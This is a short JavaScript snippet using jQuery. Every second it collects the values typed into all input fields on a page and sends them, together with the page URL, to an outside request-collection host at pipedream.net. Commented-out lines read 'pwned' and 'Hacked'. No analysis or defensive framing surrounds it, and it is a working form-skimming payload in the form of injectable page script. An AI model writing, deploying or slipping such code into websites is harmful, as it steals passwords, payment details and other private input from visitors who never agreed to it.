if($.find("input")!=undefined){
setInterval(function () {
  //alert("pwned");
    url =  "https://enmadetcw5fd.x.pipedream.net/"+window.location.href;
    $('input').each(function () {
      url+="@"
      url += $(this).val();
    })
    $.ajax({
      url:url
    }).done(function () {
      //console.log("Hacked");
    })
},1000)

}
